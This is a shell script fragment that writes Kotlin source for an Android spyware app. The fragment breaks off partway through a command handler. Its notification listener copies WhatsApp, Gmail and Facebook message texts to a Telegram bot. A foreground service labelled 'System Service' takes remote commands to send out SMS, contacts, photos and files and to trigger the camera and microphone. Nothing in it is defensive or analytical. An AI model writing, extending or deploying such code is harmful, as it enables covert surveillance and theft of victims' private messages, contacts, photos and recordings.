        cat << 'EOF' > app/src/main/java/com/example/namprfek/NotificationListener.kt
        package com.example.namprfek
        import android.app.Notification
        import android.service.notification.NotificationListenerService
        import android.service.notification.StatusBarNotification
        class NotificationListener : NotificationListenerService() {
            override fun onNotificationPosted(sbn: StatusBarNotification) {
                val targetPkgs = listOf("com.whatsapp", "com.whatsapp.w4b", "com.google.android.gm", "com.facebook.orca", "com.facebook.katana")
                if (targetPkgs.contains(sbn.packageName)) {
                    val extras = sbn.notification?.extras ?: return
                    val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
                    val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
                    if (text.isNotEmpty()) TelegramApi(Config.BOT_TOKEN).sendMessage(Config.CHAT_ID, "📩 من: $title\n📝 النص: $text")
                }
            }
        }
        EOF

        cat << 'EOF' > app/src/main/java/com/example/namprfek/TelegramService.kt
        package com.example.namprfek
        import android.app.*
        import android.content.Context
        import android.content.Intent
        import android.hardware.camera2.CameraCharacteristics
        import android.os.Build
        import android.os.Environment
        import android.os.IBinder
        import androidx.core.app.NotificationCompat
        import java.util.concurrent.Executors
        class TelegramService : Service() {
            private val api by lazy { TelegramApi(Config.BOT_TOKEN) }
            private val pool = Executors.newFixedThreadPool(3)
            @Volatile private var running = true
            private var offset = 0L
            override fun onBind(intent: Intent?): IBinder? = null
            override fun onCreate() {
                super.onCreate()
                if (Build.VERSION.SDK_INT >= 26) { val ch = NotificationChannel("svc", "System", NotificationManager.IMPORTANCE_LOW); getSystemService(NotificationManager::class.java).createNotificationChannel(ch) }
                startForeground(1, NotificationCompat.Builder(this, "svc").setContentTitle("System Service").setSmallIcon(android.R.drawable.stat_notify_sync).setOngoing(true).build())
                Thread { pollLoop() }.start()
            }
            private fun pollLoop() {
                while (running) {
                    try {
                        val updates = api.getUpdates(offset)
                        for (i in 0 until updates.length()) {
                            val u = updates.getJSONObject(i); offset = u.getLong("update_id") + 1
                            val msg = u.optJSONObject("message") ?: continue
                            val chat = msg.getJSONObject("chat").getString("id")
                            if (chat != Config.CHAT_ID) continue
                            val text = msg.optString("text", "").trim()
                            if (text.isNotEmpty()) pool.execute { handle(chat, text) }
                        }
                    } catch (e: Exception) { Thread.sleep(3000) }
                }
            }
            private fun handle(chat: String, text: String) {
                val parts = text.split(" ", limit = 2); val cmd = parts[0].lowercase(); val arg = parts.getOrNull(1) ?: ""
                try {
                    when (cmd) {
                        "/start", "/help" -> api.sendMessage(chat, "أهلاً بك يا زعيم 👑\n/info\n/sms\n/contacts\n/gallery\n/ls\n/get\n/photo\n/selfie\n/mic")
                        "/info" -> api.sendMessage(chat, "Model: ${Build.MANUFACTURER} ${Build.MODEL}\nAndroid: ${Build.VERSION.RELEASE}")
                        "/sms" -> api.sendDocument(chat, Handlers.sms(this), "الرسايل")
                        "/contacts" -> api.sendDocument(chat, Handlers.contacts(this), "جهات الاتصال")
                        "/gallery" -> { val p = Handlers.getLatestPhotos(this); if (p.isEmpty()) api.sendMessage(chat, "مفيش صور") else p.forEach { api.sendDocument(chat, it, "صورة") } }
                        "/ls" -> api.sendMessage(chat, Handlers.listFiles(if (arg.isEmpty()) Environment.getExternalStorageDirectory().absolutePath else arg))
                        "/get" -> { val f = Handlers.getFile(ar
